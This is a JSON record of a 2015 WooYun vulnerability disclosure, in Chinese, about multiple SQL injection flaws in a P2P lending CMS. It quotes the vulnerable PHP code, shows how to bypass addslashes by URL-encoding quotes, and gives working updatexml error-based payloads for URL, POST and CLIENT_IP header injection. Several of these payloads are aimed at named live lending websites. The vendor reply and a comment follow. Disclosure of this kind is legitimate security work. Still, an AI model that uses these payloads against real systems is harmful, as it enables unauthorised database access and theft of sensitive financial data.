{"id": 66817, "wybug_id": "wooyun-2015-0132558", "wybug_title": "贷齐乐系统多处SQL注入漏洞可影响到敏感数据(续)", "wybug_corp": "chinaanhe.com", "wybug_author": "loopx9", "wybug_date": "2015-08-08 09:38", "wybug_open_date": "2015-11-06 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向公众公开  简要描述： 注入真多，可能有重复的。 详细说明：  看到  WooYun: 贷齐乐系统多处SQL注入漏洞可影响大量P2P网贷站点(附100+案例) 于是也下载了一套看了下。注入漏洞确实很多。0x1 不正确url解码(urldecode、rawurldecode):文件: \\modules\\member\\index_ruizhict.php:\n# 检查邮箱是否被注册\telseif ($_U['query_class'] == 'check_email'){\t\t$email = urldecode($_REQUEST['email']);\t\t$sql = \"select * from {user} where email='{$email}'\";\t\t$result = $mysql->db_fetch_array($sql);\t\t\tif ($result == false){\t\t\techo true;exit;\t\t}else{\t\t\techo false;exit;\t\t}\t}\n对$_REQUEST['email']进行url解码然后带入sql，很明显的注入。再来看下$_REQUEST变量。文件\\core\\safe.inc.php对$_REQUEST重新进行了注册:\n$request_uri = explode(\"?\",$_SERVER['REQUEST_URI']);if(isset($request_uri[1])){\t$rewrite_url = explode(\"&\",$request_uri[1]);\tforeach ($rewrite_url as $key => $value){\t\t$_value = explode(\"=\",$value);\t\tif (isset($_value[1])){\t\t$_REQUEST[$_value[0]] = addslashes($_value[1]);\t\t}\t}}\n直接从$_SERVER['REQUEST_URI']取值，可以url编码引号，绕过addslashes。利用方式: 请求url:\n/index.php?user&q=action/check_email&email=%27or%28updatexml%281,concat%280x7e,user%28%29%29,1%29%29%23\n同样问题的还有:/index.php?user&q=code/user/addfriend&username=ad%27 (需要登录)文件\\index.php:\n/**处理表单*/elseif ($_G['query_site'] == \"actions\" ){\tif (isset($_POST['valicode'])){\t\tif ($_POST['valicode']!=$_SESSION['valicode']){\t\t\techo \"<script>alert('验证码不正确');history.go(-1);</script>\";\t\t}else{\t\t\t$data=  array();\t\t\tforeach ($_POST as  $key => $value){\t\t\t\t$data[$key] = $_POST[$key];\t\t\t}\t\t\tunset($data['valicode']);\t\t\t$_re = explode(\"/\",$_REQUEST['q']);\t\t\t$_classname = $_re[1].\"Class\";\t\t\tinclude_once(\"modules/{$_re[1]}/{$_re[1]}.class.php\");\t\t\t$_cn = new $_classname();\t\t\t$result = $_cn->$_re[2]($data);\t\t\tif ($result!=true){\t\t\t\techo \"<script>alert('操作错误');history.go(-1);</script>\";\t\t\t}else{\t\t\t\techo \"<script>alert('操作成功');history.go(-1);</script>\";\t\t\t}\t\t}\t}}\n提供了一个调用接口，可以很方便的调用modules下的类以及方法，这样漏洞利用就很方便了。\nmodules\\fee\\fee.class.php\\modules\\borrow\\borrow.class.phpmodules\\borrowline\\borrowline.class.php\n都存在urldecode导致的注入漏洞，漏洞函数GetList:利用方式:请求url:\n/index.php?actions&q=/borrow/GetList     /index.php?actions&q=/fee/GetListpost参数: valicode=&keywords=%2527\nvalicode为空绕过session判断。\n/index.php?actions&q=/borrowline/GetList&keywords=%27post参数: valicode=&keywords=request\n0x2 数字类型注入（参数进入sql语句没有引号保护）:文件:modules\\dwbbs\\dwbbs.inc.php\n//所有帖子处理if ( $q == \"postmanager\"){\t$data['id'] = $_REQUEST['tid'];\tif(empty($_REQUEST['tid'])){\t\t$data['id'] = $_REQUEST['postid'];\t\t$_G['bbs_post_result'] = dwbbsClass::GetPostsOne($data);\t}else{\t\t$_G['bbs_post_result'] = dwbbsClass::GetTopicsOne($data);\t}\tif($_REQUEST['action'] == \"movePost\"){\t\t$result = dwbbsClass::ActionForum();\t\tif ($result !=false){\t\t\t$_result = \"\";\t\t\tforeach ($result as $key => $value){\t\t\t\tif ($value['pid']==0){\t\t\t\t\t$_result .= \"<optgroup label='{$value['name']}'></optgroup>\";\t\t\t\t}else{\t\t\t\t\t$_result .= \"<option value='{$value['id']}'>{$value['aname']}</option>\";\t\t\t\t}\t\t\t}\t\t\t$magic->assign(\"_result\",$_result);\t\t}\t}\n数字类型的太多了:\n/index.php?bbs&q=postmanager&tid=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)/index.php?bbs&q=reply&tid=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)/index.php?home&user_id=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)/index.php?action&s=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)\n0x3 http头ip注入:文件:\\core\\function.inc.php: ip_address函数:\n/** * 获取IP地址 */function ip_address() {\tif(!empty($_SERVER[\"HTTP_CLIENT_IP\"])) {\t\t$ip_address = $_SERVER[\"HTTP_CLIENT_IP\"];\t}else if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"])){\t\t$ip_address = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));\t}else if(!empty($_SERVER[\"REMOTE_ADDR\"])){\t\t$ip_address = $_SERVER[\"REMOTE_ADDR\"];\t}else{\t\t$ip_address = '';\t}\treturn $ip_address;}\nip没有过滤。   漏洞证明：  \nhttp://www.6scf.com/index.php?user&q=action/check_email&email=%27or%28updatexml%281,concat%280x7e,user%28%29%29,1%29%29%23http://www.huinacaifu.com/index.php?user&q=action/check_email&email=%27or%28updatexml%281,concat%280x7e,user%28%29%29,1%29%29%23http://www.mirong.com/index.php?user&q=action/check_email&email=%27or%28updatexml%281,concat%280x7e,user%28%29%29,1%29%29%23\n\n\n\nhttp://www.bjdai.com.cn/index.php?actions&q=/borrow/GetListpost data: valicode=&keywords=%2527xor updatexml%25281,concat%25280x7e,user%2528%2529%2529,1%2529 xor%2527\n\n\n\nhttp://www.mirong.com/index.php?actions&q=/borrowline/GetList&keywords=%27or%28updatexml%281,concat%280x7e,user%28%29%29,1%29%29%23post data: valicode=&keywords=request\n\n\n数字类型注入:\nhttp://www.bjdai.com.cn/index.php?bbs&q=postmanager&tid=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)http://www.bjdai.com.cn/index.php?bbs&q=reply&tid=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)http://www.bjdai.com.cn/index.php?home&user_id=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)http://www.bjdai.com.cn/index.php?action&s=(select(0)from(select(updatexml(1,concat(0x7e,user()),1)))v)\n\n\nip头注入:\nGET /index.php?user&q=action/login HTTP/1.0Host: www.bjdai.com.cnProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webpUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8CLIENT_IP: '+updatexml(1,concat('~',user()),1)#\n\n\n   修复方案：  。。注入太多了。。   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-08 11:07 厂商回复： 感觉测试，你测试的都是贷齐乐盗版客户，这些用户没有买过我们的系统，应该是网上下载的2年前的版本 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-12 17:03 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1255 漏洞数:324        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  注入牛，给跪下了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}